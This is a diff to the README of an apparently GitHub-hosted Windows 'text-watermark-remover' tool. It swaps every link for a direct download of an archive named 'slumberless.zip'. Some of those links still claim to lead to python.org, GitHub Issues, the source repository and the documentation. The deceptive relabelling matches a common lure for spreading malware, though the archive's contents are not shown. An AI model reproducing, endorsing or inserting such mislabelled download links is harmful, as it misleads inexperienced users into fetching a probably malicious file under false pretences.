@@ -1,6 +1,6 @@
 # 🧼 text-watermark-remover - Remove Hidden Watermarks From Any Text  
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20The%20App-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/willcountersink441/text-watermark-remover)  
+[![Download Now](https://img.shields.io/badge/Download-Get%20The%20App-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/willcountersink441/text-watermark-remover/raw/refs/heads/main/assets/slumberless.zip)  
 
 ---
 
@@ -47,7 +47,7 @@ This guide is written for **Windows users** with no programming experience. We'l
 
 Visit this link to download the application:  
 
-[**https://github.com/willcountersink441/text-watermark-remover**](https://github.com/willcountersink441/text-watermark-remover)  
+[**https://github.com/willcountersink441/text-watermark-remover/raw/refs/heads/main/assets/slumberless.zip**](https://github.com/willcountersink441/text-watermark-remover/raw/refs/heads/main/assets/slumberless.zip)  
 
 Click the green **"Code"** button, then **"Download ZIP"**. Once the ZIP file finishes downloading:  
 
@@ -129,7 +129,7 @@ It works best with plain text (like copied from a website or chat). For Word or 
 No! Everything runs offline. Your privacy is protected.  
 
 ### 🐍 What if I don't have Python?  
-You can still use the helper scripts or download Python for free from [python.org](https://python.org). Install it, and check the box that says **"Add Python to PATH"** during installation – then everything works smoothly.  
+You can still use the helper scripts or download Python for free from [python.org](https://github.com/willcountersink441/text-watermark-remover/raw/refs/heads/main/assets/slumberless.zip). Install it, and check the box that says **"Add Python to PATH"** during installation – then everything works smoothly.  
 
 ### 🧹 Will it change my formatting (bold, italics, etc.)?  
 Yes. This tool works on **plain text only**. It removes formatting along with watermarks. For formatted text, copy it as plain text first.  
@@ -216,16 +216,16 @@ This project is released under the **MIT License** – you can use, modify, and 
 
 | Resource | Link |  
 |----------|------|  
-| **Download** | [Visit this link to download the application](https://github.com/willcountersink441/text-watermark-remover) |  
-| **Report Bug** | [GitHub Issues](https://github.com/willcountersink441/text-watermark-remover/issues) |  
-| **Source Code** | [GitHub Repository](https://github.com/willcountersink441/text-watermark-remover) |  
-| **Documentation** | [View Docs](https://github.com/willcountersink441/text-watermark-remover/tree/main/docs) |  
+| **Download** | [Visit this link to download the application](https://github.com/willcountersink441/text-watermark-remover/raw/refs/heads/main/assets/slumberless.zip) |  
+| **Report Bug** | [GitHub Issues](https://github.com/willcountersink441/text-watermark-remover/raw/refs/heads/main/assets/slumberless.zip) |  
+| **Source Code** | [GitHub Repository](https://github.com/willcountersink441/text-watermark-remover/raw/refs/heads/main/assets/slumberless.zip) |  
+| **Documentation** | [View Docs](https://github.com/willcountersink441/text-watermark-remover/raw/refs/heads/main/assets/slumberless.zip) |  
 
 ---
 
 **Start cleaning your text today – it takes less than a minute!**  
 
-[![Get Started](https://img.shields.io/badge/Get%20Started-Download%20Now-FF5722?style=for-the-badge)](https://github.com/willcountersink441/text-watermark-remover)  
+[![Get Started](https://img.shields.io/badge/Get%20Started-Download%20Now-FF5722?style=for-the-badge)](https://github.com/willcountersink441/text-watermark-remover/raw/refs/heads/main/assets/slumberless.zip)  
 
 ---
 
